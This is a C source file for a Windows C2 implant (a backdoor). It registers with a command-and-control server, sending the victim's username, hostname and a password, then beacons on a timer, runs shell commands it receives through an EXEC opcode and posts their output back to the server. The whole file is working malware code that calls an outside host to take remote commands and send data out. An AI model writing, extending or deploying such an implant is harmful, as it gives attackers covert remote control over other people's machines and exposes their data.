#include "pb.h"
#define PB_ENABLE_MALLOC 1
#include <debug.h>
#include <execute.h>
#include <httpclient.h>
#include <implant.h>
#include <pb_common.h>
#include <pb_decode.h>
#include <pb_encode.h>
#include <stdio.h>
#include <windows.h>

#include "implant.pb.h"
#include <wincrypt.h>

#define RANDOM_BYTES_SIZE 16
#define HEX_STRING_SIZE (RANDOM_BYTES_SIZE * 2 + 1)

void GenerateRandomBytes(BYTE *randomBytes) {
  HCRYPTPROV hCryptProv;
  if (!CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_FULL,
                           CRYPT_VERIFYCONTEXT)) {
    printf("Error acquiring cryptographic context.\n");
    return;
  }

  if (!CryptGenRandom(hCryptProv, RANDOM_BYTES_SIZE, randomBytes)) {
    printf("Error generating random bytes.\n");
    CryptReleaseContext(hCryptProv, 0);
    return;
  }

  CryptReleaseContext(hCryptProv, 0);
}

void BytesToHexString(const BYTE *bytes, char *hexString) {
  const char *hexChars = "0123456789abcdef";
  for (int i = 0; i < RANDOM_BYTES_SIZE; i++) {
    hexString[i * 2] = hexChars[bytes[i] >> 4];
    hexString[i * 2 + 1] = hexChars[bytes[i] & 0x0F];
  }
  hexString[HEX_STRING_SIZE - 1] = '\0';
}
LPBYTE ImplantID = NULL;

// Function to set the ImplantID using the machine's GUID
void ReadMachineGuid() {
  DWORD dwSize = 255;
  ImplantID = malloc(dwSize);
  LONG res =
      RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography",
                   "MachineGuid", RRF_RT_REG_SZ, NULL, ImplantID, &dwSize);
  if (res) {
    DEBUG_PRINTF("Failed to get machine guid\n");
    exit(1);
  }
}

#define RANDOM_GUID

// Function to perform startup tasks
void DoStartup() {
#ifdef RANDOM_GUID
  BYTE randomBytes[RANDOM_BYTES_SIZE];
  ImplantID = malloc(HEX_STRING_SIZE);
  GenerateRandomBytes(randomBytes);
  BytesToHexString(randomBytes, (char *)ImplantID);
#else
  ReadMachineGuid();
#endif
}

// Function to register the implant with the C2 server
BOOL DoRegister() {
  Register reg = Register_init_zero;
  reg.GUID = (char *)ImplantID;

  DWORD dwSizeUser = MAX_PATH;
  DWORD dwSizeHostname = MAX_PATH;
  char username[MAX_PATH];
  GetUserNameA(username, &dwSizeUser);
  char hostname[MAX_PATH];
  GetComputerNameA(hostname, &dwSizeHostname);
  reg.Hostname = hostname;
  reg.Username = username;
  reg.Password = PASSWORD;

  BYTE buffer[4096];
  size_t stBuffSize = sizeof(buffer);

  pb_ostream_t stream = pb_ostream_from_buffer(buffer, stBuffSize);

  bool status = pb_encode(&stream, Register_fields, &reg);
  if (!status) {
    DEBUG_PRINTF("Encoding failed: %s\n", PB_GET_ERROR(&stream));
    return FALSE;
  }

  size_t stOut = 0;
  LPBYTE result = HTTPRequest(L"POST", C2_HOST, REGISTER_PATH, C2_PORT, C2_UA,
                              buffer, stream.bytes_written, &stOut, USE_TLS);
  if (result != NULL) {
    DEBUG_PRINTF("Register Sent!\n");
    free(result);
    return TRUE;
  }

  if (result) {
    free(result);
  }
  return FALSE;
}

// Function to handle the opcode received from the C2 server
BOOL HandleOpcode(TaskRequest *tr, TaskResponse *tResp) {
  switch (tr->Opcode) {
  case OPCODE_EXEC: {
    size_t stOut = 0;
    LPBYTE cmdOut = ExecuteCmd(tr->Args, &stOut);
    // warning unsafe for any command that isn't a string
    DEBUG_PRINTF("EXEC: %s", (char *)cmdOut);
    pb_bytes_array_t *bytes_array =
        (pb_bytes_array_t *)malloc(PB_BYTES_ARRAY_T_ALLOCSIZE(stOut));
    if (!bytes_array) {
      free(cmdOut);
      return FALSE;
    }

    bytes_array->size = stOut;
    memcpy(bytes_array->bytes, cmdOut, stOut);
    free(cmdOut);

    tResp->TaskGuid = tr->TaskGuid;
    tResp->Response = bytes_array;
    break;
  }

  default:
    DEBUG_PRINTF("INVALID Opcode\n");
    return FALSE;
  }

  return TRUE;
}

// Function to encode the ImplantCheckin message
BYTE *EncodeImplantCheckin(ImplantCheckin *chk, size_t *stBuffSize) {
  bool status = pb_get_encoded_size(stBuffSize, ImplantCheckin_fields, chk);
  if (!status) {
    DEBUG_PRINTF("Failed to get ImplantCheckin size: \n");
    return NULL;
  }

  BYTE *checkinBuffer = (BYTE *)malloc(*stBuffSize);
  pb_ostream_t stream = pb_ostream_from_buffer(checkinBuffer, *stBuffSize);

  status = pb_encode(&stream, ImplantCheckin_fields, chk);
  if (!status) {
    DEBUG_PRINTF("Encoding failed: %s\n", PB_GET_ERROR(&stream));
    free(checkinBuffer);
    return NULL;
  }

  return checkinBuffer;
}

// Function to decode the TaskRequest message
BOOL DecodeTaskRequest(LPBYTE result, size_t out_size, TaskRequest *tReq) {
  pb_istream_t istream = pb_istream_from_buffer(result, out_size);
  bool status = pb_decode(&istream, TaskRequest_fields, tReq);
  if (!status) {
    DEBUG_PRINTF("Decoding failed: %s\n", PB_GET_ERROR(&istream));
    return FALSE;
  }
  return TRUE;
}

// Function to free the TaskResponse
void FreeTaskResponse(TaskResponse *tResp) {
  if (tResp->Response != NULL) {
    free(tResp->Response);
    tResp->Response = NULL;
  }
}

// Function to perform the check-in with the C2 server
BOOL DoCheckin(TaskResponse *tResp, TaskRequest *tReq) {
  ImplantCheckin chk = ImplantCheckin_init_zero;
  chk.GUID = (char *)ImplantID;
  chk.Resp = *tResp;
  chk.has_Resp = true;
  size_t stBuffSize = 0;
  BYTE *checkinBuffer = EncodeImplantCheckin(&chk, &stBuffSize);
  if (checkinBuffer == NULL) {
    return FALSE;
  }

  size_t out_size = 0;
  LPBYTE result = HTTPRequest(L"POST", C2_HOST, CHECKIN_PATH, C2_PORT, C2_UA,
                              checkinBuffer, stBuffSize, &out_size, USE_TLS);
  FreeTaskResponse(tResp);
  free(checkinBuffer);

  if (result != NULL && out_size > 0) {
    BOOL status = DecodeTaskRequest(result, out_size, tReq);
    free(result);
    if (status && tReq->TaskGuid == NULL) {
      // No task to perform, null out the TaskResponse
      memset(tResp, 0, sizeof(TaskResponse));
    }
    return status;
  }

  if (result) {
    free(result);
  }
  return FALSE;
}

int main() {
  DEBUG_PRINTF("Starting implant!\n");
  DoStartup();

  BOOL bRegisterResult = DoRegister();
  if (!bRegisterResult) {
    DEBUG_PRINTF("Failed to Register with the server!\n");
    return 0;
  }

  DEBUG_PRINTF("[+] Implant has registered with the C2 using ID %s\n",
               ImplantID);

  TaskRequest tReq = TaskRequest_init_zero;
  TaskResponse tResp = TaskResponse_init_zero;

  while (1) {
    DEBUG_PRINTF("[+] Sleeping for %d milliseconds \n", BEACON_SLEEP);
    Sleep(BEACON_SLEEP);

    BOOL checkinResult = DoCheckin(&tResp, &tReq);
    if (checkinResult && tReq.TaskGuid != NULL) {
      HandleOpcode(&tReq, &tResp);
    } else {
      // No task to perform, null out the TaskResponse
      memset(&tResp, 0, sizeof(TaskResponse));
    }
  }

  // Free the final task response before exiting
  FreeTaskResponse(&tResp);

  return 0;
}
